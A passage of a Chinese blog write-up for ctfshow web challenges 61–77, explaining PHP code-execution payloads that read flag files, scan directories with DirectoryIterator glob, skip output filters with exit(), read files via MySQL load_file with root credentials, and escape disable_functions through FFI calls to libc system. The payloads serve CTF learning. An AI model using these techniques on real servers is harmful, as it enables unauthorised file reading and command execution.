c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetcsv</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p>同时记录一个,但是这道题不能用<br> <code>$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetss($a);echo $line;} //php7.3版本后 该函数已不再被使用 </code><br> 还有新姿势</p> 
<pre><code class="prism language-php"><span class="token comment">//通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span>
<span class="token function">copy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">rename</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">//用法：</span>
<span class="token function">copy</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//过60</span>
<span class="token function">rename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//过60</span>

</code></pre> 
<h2><a id="web6165_422"></a>web61-65</h2> 
<p>为了熟悉学习新姿势<code>c=$a=opendir('./');while(($file = readdir($a)) !=false){echo $file." ";}</code>或者<code>c=print_r(scandir(current(localeconv())));</code></p> 
<pre><code class="prism language-php"><span class="token comment">//payload:</span>
c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2><a id="web6667_430"></a>web66-67</h2> 
<p>扫描目录<code>c=var_dump(scandir("/"));</code>,发现是<code>flag.txt</code></p> 
<pre><code class="prism language-php"><span class="token comment">//下面是payload</span>
c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2><a id="web6870_439"></a>web68-70</h2> 
<p>快乐第一步扫描目录<code>c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f-&gt;__toString()." ");}</code></p> 
<pre><code class="prism language-php"><span class="token comment">//payload介绍</span>
c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2><a id="web71_447"></a>web71</h2> 
<p>代码审计,这里先介绍几个函数<br> ob_get_contents — 返回输出缓冲区的内容<br> ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p> 
<p>然后看这里有一句官方的介绍</p> 
<blockquote> 
 <p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p> 
</blockquote> 
<p>作一个实验</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("ls");'</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//在网页中会输出内容</span>
<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("ls");'</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//</span>
<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("ls");'</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token comment">//在这里则在网页当中没有输出内容，不难看出其取得了缓冲区的内容并清空了缓冲区</span>
</code></pre> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 你们在炫技吗？</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>所以不难想出payload<code>c=require_once('/flag.txt');exit();</code>这里通过<code>exit();</code>使程序提前退出，绕过后面的正则表达式</p> 
<h2><a id="web72_495"></a>web72</h2> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'?&gt;&lt;?php echo 111;?&gt;'</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>这里的?&gt;是为了闭合前面&lt;?php</p> 
<pre><code class="prism language-php">payload<span class="token punctuation">:</span>https<span class="token punctuation">:</span><span class="token comment">//github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</span>
需要把里面的payload进行url编码
</code></pre> 
<h2><a id="web7374_506"></a>web73-74</h2> 
<p>第一步扫描目录</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
payload<span class="token punctuation">:</span>
c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flagc.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flagc.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flagc.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2><a id="web7576_515"></a>web75-76</h2> 
<p>第一步扫描目录<br> <code>c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f-&gt;__toString().' ');}exit(0);</code><br> 利用mysql load_file读文件</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span>
<span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span>
<span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2><a id="web77_526"></a>web77</h2> 
<p>第一遍扫描目录<code>c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f-&gt;__toString().' ');}exit(0);</code>然后发现下面有一个<code>readflag</code>肯定是要调用这个,不会做，看了这个FFI拓展挺神奇的，说谁php7.4版本以上才有，大家想了解可以看看下面的参考链接</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token variable">$ffi</span><span class="token operator">=</span><span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"int system(char *command);"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'/readflag &gt; 1.txt'</span><span class="token punctuation">;</span><span class="token variable">$ffi</span><span class="token operator">-&gt;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
</code></pre> 
<h2><a id="_531"></a>参考文章</h2> 
<p><a href="http://blog.leanote.com/post/bowu/de8babf67fd8" rel="nofollow">CTF之命令执行绕过总结</a><br> <a href="https://www.cnblogs.com/NPFS/p/13279815.html" rel="nofollow">CTF命令执行</a><br> <a href="https://www.cnblogs.com/raind/p/10295528.html" rel="nofollow">nginx(一）之默认配置文件</a><br> <a href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41</a><br> <a href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a><br> <a href="https://wh0ale.github.io/2019/01/13/2019-1-13-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="nofollow">命令执行漏洞进阶详解</a><br> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" rel="nofollow">无字母数字webshell之提高篇</a><br> <a href="http://blog.sina.com.cn/s/blog_af68a2c201016nh2.html" rel="nofollow">LINUX中的点命令，或source命令，或点符号</a><br> <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">无字母数字的命令执行(ctfshow web入门 55）</a><br> <a href="https://www.cnblogs.com/chengd/p/7803664.html" rel="nofollow">Linux—shell中<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
          ) 
         
        
          ) 
         
        
          、 
         
        
       
         (( ))、 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">、</span></span></span></span></span>( )、``与${ }的区别</a><br> <a href="https://blog.csdn.net/miuzzx/article/details/108619930">ctfshow web入门58-77绕过disable function</a><br> <a href="https://www.laruence.com/2020/03/11/5475.html" rel="nofollow">PHP FFI详解 - 一种全新的PHP扩展方式</a></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/2fbf661c3071200579e0bb8e4b21adbc/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">关于getMethod()方法</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/5dcc6e8539530fed98bad833d9402b90/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">《Protein Actions Principles and Modeling》-《蛋白质作用原理和建模》中文分享（7）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>